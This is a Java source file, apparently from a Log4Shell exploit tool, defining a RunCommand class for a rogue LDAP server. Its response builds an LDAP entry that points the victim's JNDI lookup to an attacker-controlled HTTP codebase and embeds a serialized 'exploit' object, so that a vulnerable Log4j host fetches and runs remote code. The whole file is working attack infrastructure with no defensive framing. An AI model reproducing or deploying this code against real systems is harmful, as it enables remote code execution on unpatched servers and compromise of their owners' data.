package log4shell;

import com.unboundid.ldap.sdk.DN;
import com.unboundid.ldap.sdk.Entry;

public final class RunCommand extends Command {
  private final Config config;
  private final String className;

  public RunCommand(DN dn, Config config, String className) {
    super(dn);
    this.config = config;
    this.className = className;
  }

  @Override
  public Entry response() {
    String codebase = config.getHttpServerUri().toASCIIString();

    System.out.printf(
        "Send LDAP entry for DN «%s» redirecting to code base «%s»%n", getDn(), codebase);

    Entry entry = new Entry(getDn());
    entry.addAttribute("objectClass", "top");
    entry.addAttribute("objectClass", "javaContainer");
    entry.addAttribute("objectClass", "javaObject");
    entry.setAttribute("javaCodeBase", codebase);

    serializedObject(entry, codebase);

    return entry;
  }

  private void namingReference(Entry entry) {
    entry.addAttribute("objectClass", "javaNamingReference");
    entry.setAttribute("javaClassName", "java.lang.String");
    entry.setAttribute("javaFactory", className);
  }

  private void serializedObject(Entry entry, String codebase) {
    entry.addAttribute("objectClass", "javaSerializedObject");

    try {
      Object exploit = newExploitInstance();
      byte[] data = IO.serialize(exploit);

      entry.setAttribute("javaClassName", className);
      entry.setAttribute("javaSerializedData", data);
      entry.setAttribute("javaCodebase", codebase);

    } catch (Exception e) {
      e.printStackTrace();
      entry.setAttribute("javaClassName", "java.lang.String");
      entry.setAttribute("javaSerializedData", IO.EMPTY_STRING);
    }
  }

  private Object newExploitInstance()
      throws ClassNotFoundException, InstantiationException, IllegalAccessException {

    Class<?> klass = Class.forName(className);
    Object instance = klass.newInstance();

    if (instance instanceof WithParams) {
      ((WithParams) instance).setParams(getDn().getParent());
    }
    if (instance instanceof WithHttpServerUri) {
      ((WithHttpServerUri) instance).setHttpServerUri(config.getHttpServerUri());
    }
    return instance;
  }
}
